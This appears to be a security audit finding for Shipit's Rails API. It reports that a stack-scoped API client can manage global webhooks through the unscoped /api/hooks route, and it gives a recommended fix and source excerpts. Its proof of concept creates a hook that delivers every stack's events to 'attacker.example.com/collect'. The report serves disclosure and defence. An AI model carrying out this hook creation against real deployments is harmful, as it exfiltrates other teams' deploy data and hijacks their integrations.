### Title
Stack-scoped `ApiClient` can create/read/manage global webhooks that receive events for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`ApiClient` records can be scoped to a single `Stack` via `belongs_to :stack` / `stack_id`, and every stack-scoped API endpoint (`Api::BaseController#stacks`/`#stack`) enforces that scoping by restricting the visible/addressable stacks to `Stack.where(id: current_api_client.stack_id)`. However, the top-level, non-stack-scoped route `resources :hooks` in `config/routes.rb` bypasses this binding entirely, letting a stack-scoped client with `write:hook`/`read:hook` permission manage **global** hooks that receive delivery events for **all** stacks, not just the one stack its token authorizes.

### Finding Description
The trust binding that is supposed to hold everywhere in the API is:
`current_api_client.stack_id (the stack the token authorises) == the stack the request touches`

This is enforced in `Api::BaseController`: [1](#0-0) 

and used by every stack-scoped resource (`stacks`, `tasks`, `deploys`, `merge_requests`, and the nested `hooks` route). But `config/routes.rb` also mounts a **second**, unscoped hooks collection outside any stack scope: [2](#0-1) 

`Api::HooksController` determines the target `stack_id` purely from `params[:stack_id]`, with no fallback to enforce `current_api_client.stack_id`: [3](#0-2) 

When hitting `/api/hooks` (no `stack_id` param), `stack_id` is `nil`, so `hooks` resolves to `Hook.where(stack_id: nil)` — i.e. **global** hooks. The only authorization check performed is the coarse-grained permission check `require_permission :read, :hook` / `:write, :hook`, which is not scoped to any particular stack: [4](#0-3) [5](#0-4) 

A global `Hook` (`stack_id: nil`) is delivered for every matching event across the entire Shipit installation, regardless of which stack emitted the event: [6](#0-5) 

So a client whose token was only ever meant to authorize one stack (`belongs_to :stack`) can, through the unscoped `/api/hooks` collection, create a hook (with a URL/secret of the attacker's choosing) that will receive `stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `merge_status`, `merge`, and `pull_request` event payloads for **every** stack in the deployment — including ones it has no authorization to see. It can equally read, update, or delete existing global hooks belonging to other teams/stacks (`Hook.global`), destroying legitimate notification/automation integrations or redirecting their secret/delivery URL to an attacker-controlled endpoint.

### Impact Explanation
This breaks the "a stack a token authorises versus a stack it touches" binding described for High severity findings: an `ApiClient` scoped to stack A gains unauthorized read of task/deploy/rollback state (and write/hijack of delivery configuration) for every other stack B, C, … in the instance, via the global hooks collection. Existing scoped nested `/api/stacks/:stack_id/hooks` correctly enforces the client's stack scope through `stack`/`stacks`; the unscoped `/api/hooks` collection does not, so the boundary that "a token scoped to one stack cannot see or affect other stacks" is broken system-wide.

### Likelihood Explanation
Any deployment that issues stack-scoped `ApiClient` tokens with `read:hook`/`write:hook` permission (a normal, documented permission combination — see fixture `here_come_the_walrus`/`spy`) is affected. No special privilege beyond a valid, stack-scoped API token is required; the attacker simply calls the top-level `/api/hooks` route instead of the nested one. This is a straightforward, always-reachable route confusion rather than a theoretical edge case.

### Recommendation
In `Api::HooksController`, enforce the client's own stack scope even on the unscoped collection: reject/restrict access to global hooks unless `current_api_client.stack_id.nil?` (i.e., only clients that are themselves unscoped/"global" clients should be able to manage global hooks), for example:

```ruby
def hooks
  raise ActionController::RoutingError, 'Not Found' if current_api_client.stack_id? && stack_id.nil?

  Hook.where(stack_id:)
end
```

or equivalently add a `before_action` that 403s any request to the unscoped hooks endpoints when `current_api_client.stack_id` is present.

### Proof of Concept
1. Create/obtain an `ApiClient` scoped to Stack A (`stack_id` set), with permissions `['read:hook', 'write:hook']` (a normal, documented configuration, e.g. fixture `here_come_the_walrus` plus `write:hook`).
2. Authenticate to the API with that client's token.
3. `POST /api/hooks` with `{ delivery_url: "https://attacker.example.com/collect", events: ["deploy","task","rollback","merge"] }` — no `stack_id` present in the path.
   - `Api::HooksController#create` calls `hooks.create(params)` where `hooks` resolves to `Hook.where(stack_id: nil)`, creating a **global** hook, because `stack_id` (the private helper) is `nil` when `params[:stack_id]` is absent.
4. From then on, `Hook.deliver` fires this global hook for `deploy`/`task`/`rollback`/`merge` events on **every** stack in the Shipit instance (not just Stack A), sending their payloads to the attacker-controlled `delivery_url`.
5. The same unscoped client can also `GET /api/hooks`, `PATCH /api/hooks/:id`, `DELETE /api/hooks/:id` to read, tamper with, or delete other teams' global hooks, none of which are limited to Stack A. [7](#0-6)

# frozen_string_literal: true

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end

      params do
        accepts :delivery_url, String
        accepts :events, Array[String]
        accepts :content_type, String
      end
      def update
        hook.update(params)
        render_resource(hook)
      end

      def destroy
        render_resource(hook.destroy)
      end

      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
    end
  end
end

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
